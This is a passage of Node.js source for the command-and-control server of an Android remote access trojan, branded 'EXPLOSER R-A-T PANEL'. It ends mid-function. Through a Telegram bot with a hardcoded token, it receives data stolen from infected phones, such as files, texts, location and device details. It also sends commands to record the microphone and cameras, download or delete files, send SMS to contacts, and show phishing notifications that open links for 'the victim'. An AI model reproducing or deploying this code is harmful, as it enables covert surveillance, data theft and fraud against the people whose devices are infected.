
const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6854098306:AAG_-RBCR5jhMNxr-VB59iwILLnWvw16Iyk'
const id = '6665281077'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝐂𝐌𝐊 𝐒𝐄𝐑𝐕𝐄𝐑 𝐔𝐏𝐋𝐎𝐀𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 😈</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 𝗖𝗛𝗔𝗜𝗧𝗔𝗡𝗬𝗔 𝗞𝗨𝗟𝗞𝗔𝗥𝗡𝗜 👉 { DEVELOPED BY @CHAITANYA_KULKARNI_509 }<b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 𝗖𝗛𝗔𝗜𝗧𝗔𝗡𝗬𝗔 𝗞𝗨𝗟𝗞𝗔𝗥𝗡𝗜 👉 { DEVELOPED BY @CHAITANYA_KULKARNI_509 }<b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 𝐍𝐄𝐖 𝐃𝐄𝐕𝐈𝐂𝐄 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃😁\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ 📱: <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ 🔋: <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ ❄️: <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ ☀️: <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ  📶: <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°•  𝐃𝐄𝐕𝐈𝐂𝐄 𝐃𝐈𝐒𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃😔\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ 📱: <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ 🔋: <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ ❄️: <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ ☀️: <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ  📶: <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝐂𝐇𝐀𝐈𝐓𝐀𝐍𝐘𝐀 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐈𝐒 𝐎𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 👀👺\n\n' +
                '• ᴄʜᴀɪᴛᴀɴʏᴀ,ᴄʜᴀɪᴛᴀɴʏᴀ,ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ🦅🦅',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝗘𝗫𝗣𝗟𝗢𝗦𝗘𝗥 𝗥-𝗔-𝗧 𝗣𝗔𝗡𝗘𝗟 𝗢𝗙 𝗠𝗥.𝗖𝗛𝗔𝗜𝗧𝗔𝗡𝗬𝗔 𝗞𝗨𝗟𝗞𝗔𝗥𝗡𝗜 👨‍💻\n\n' +
                '• 𝐏𝐋𝐄𝐀𝐒𝐄 𝐃𝐎 𝐍𝐎𝐓 𝐌𝐈𝐒𝐔𝐒𝐄 𝐄𝐗𝐏𝐋𝐎𝐒𝐄𝐑 𝐑-𝐀-𝐓 𝙥𝙖𝙣𝙚𝙡 , 𝐈𝐅 𝐀𝐍𝐘 𝐈𝐋𝐋𝐄𝐆𝐀𝐋 𝐀𝐂𝐓𝐕𝐈𝐓𝐘 𝐇𝐀𝐏𝐏𝐄𝐍𝐒 𝐓𝐇𝐄 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐍𝐎𝐓 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐈𝐁𝐋𝐄 𝐓𝐇𝐄 𝐀𝐋𝐋 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐈𝐁𝐋𝐈𝐓𝐘 𝐆𝐎𝐄𝐒 𝐓𝐎 𝐓𝐇𝐄 𝐔𝐒𝐄𝐑 🤑\n\n' +
                '•  𝐈𝐅 𝐓𝐇𝐄 𝐀𝐏𝐏𝐋𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐈𝐒 𝐈𝐍𝐒𝐓𝐀𝐋𝐋𝐄𝐃 𝐎𝐍 𝐓𝐇𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐄𝐕𝐈𝐂𝐄, 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐓𝐇𝐄 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 💻\n\n' +
                '• 𝐖𝐇𝐄𝐍 𝐘𝐎𝐔 𝐑𝐄𝐂𝐈𝐕𝐄 𝐓𝐇𝐄 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 , 𝐈𝐓 𝐌𝐄𝐀𝐍𝐒 𝐓𝐇𝐀𝐓 𝐓𝐇𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 𝐈𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐀𝐍𝐃 𝐑𝐀𝐃𝐘 𝐓𝐎 𝐑𝐄𝐂𝐄𝐈𝐕𝐄 𝐓𝐇𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 😄\n\n' +
                '• 𝐂𝐋𝐈𝐂𝐊 𝐎𝐍 𝐓𝐇𝐄 𝐂𝐌𝐊 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐁𝐔𝐓𝐓𝐎𝐍 𝐀𝐍𝐃 𝐒𝐋𝐄𝐋𝐄𝐂𝐓 𝐓𝐇𝐄 𝐃𝐄𝐒𝐈𝐑𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄 𝐓𝐇𝐄𝐍 𝐒𝐄𝐋𝐄𝐂𝐓 𝐓𝐇𝐄 𝐃𝐄𝐒𝐈𝐑𝐄𝐃 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐀𝐌𝐎𝐍𝐆 𝐓𝐇𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 🙋\n\n' +
                '• 𝐈𝐅 𝐘𝐎𝐔 😇 𝐆𝐄𝐓 𝐒𝐓𝐔𝐂𝐊 𝐒𝐎𝐌𝐄𝐖𝐇𝐄𝐑𝐄 𝐈𝐍 𝐁𝐎𝐓, 𝐒𝐄𝐍𝐃 /start 𝐂𝐎𝐌𝐌𝐀𝐍𝐃',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️"], ["𝐂𝐌𝐊 𝐄𝐗𝐄𝐂𝐔𝐓𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ♣️"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝐂𝐌𝐊 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐃𝐄𝐕𝐈𝐂𝐄𝐒 ♠️') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
